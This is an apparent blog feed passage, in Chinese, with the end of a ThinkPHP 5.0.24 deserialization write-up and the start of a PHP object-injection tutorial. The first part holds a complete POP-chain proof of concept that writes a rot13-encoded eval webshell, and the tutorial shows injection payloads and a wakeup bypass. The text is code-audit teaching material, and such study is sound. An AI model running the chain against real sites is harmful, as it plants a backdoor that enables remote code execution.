punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//触发Model __toString(),子类Pivot合适</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Relation</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#class Query</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token shell-comment comment">#OneToOne HasOne</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用其write()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Model</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token shell-comment comment">#修改处</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$aaaaa</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output对象,目的是调用__call()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Relation子类,且有getBindAttr()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//isSelfRelation()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Query</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Memcached</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用File->set()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#File</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?>',</span>            <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>poc只能对linux，windows限制了文件名，最后，文件的命名规则如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>cuc <span class="token function">cucvasb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">riny</span><span class="token punctuation">(</span><span class="token variable">$_TRG</span><span class="token punctuation">[</span>pzq<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/10.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364#h2-0</a></p><p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：&lt;/p&gt;
&lt;pre class=&quot; language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token d
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化到pop链构造</title>
    <link href="http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-04-25T16:00:00.000Z</published>
    <updated>2020-04-29T06:53:41.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a><strong>序列化与反序列化</strong></h4><p>在php中，使用serialize和unserialize两个函数表示序列化与反序列化。</p><pre><code>serialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法unserialize：把字节流字符串转化成一个对象</code></pre><p>看下下面的列子，通过serialize序列化返回字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token string">'fanxing'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>返回字节流的字符串</p><pre><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p>O代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;…}</p><p>反序列化列子如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:1:"A":2:{s:4:"name";s:7:"fanxing";s:3:"age";s:2:"20";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>打印出Skill方法中的值</p><p><code>My name is fanxing,I am is 20 years old!</code></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><strong>魔术方法</strong></h4><p>在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：</p><p><strong>__construct()</strong>    </p><p>当一个对象被创建的时候调用该方法。</p><p><strong>__destruct()</strong></p><p>当一个对象被删除和销毁的时候调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象销毁调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__toString</strong></p><p>当一个对象被当成字符串的时候进行调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象字符串调用"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__invoke</strong></p><p>当一个对象以函数的方式进行调用的时候会被调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象以函数调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__sleep</strong></p><p>对象在使用serialize函数前会先调用，在执行序列化的操作。</p><p><strong>__wakeup</strong></p><p>对象在使用unserialize函数前会先调用，在执行反序列化的操作。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"序列化被调用&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"反序列化被调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__call</strong></p><p>对象在调用不可访问的方法的时候触发</p><p><strong>__callStatic</strong></p><p>在静态中调用不可访问的方法的时候会触发</p><p><strong>__set</strong></p><p>给不可以访问的属性赋值被调用</p><p><strong>__get</strong></p><p>读取不可访问的属性值被调用</p><p><strong>__isset</strong></p><p>不可访问的属性调用为 isset() 或 empty()时被调用</p><p><strong>__unset</strong></p><p>对不可以访问的属性使用unset会被调用</p><h4 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a><strong>对象注入</strong></h4><p>满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里我们打印下序列化结果，发现属性的长度是7。</p><pre><code>O:1:&quot;A&quot;:1:{s:7:&quot;Aname&quot;;N;}</code></pre><p>这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。</p><pre><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D</code></pre><p>同样，也可以加属性名前面添加\00*\00，构造下pyalod直接执行了任意代码</p><pre><code>O%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A10%3A&quot;phpinfo%28)%3B&quot;%3B%7D</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png" alt="" loading="lazy"></p><p>在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：</p><pre><code>PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10</code></pre><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span 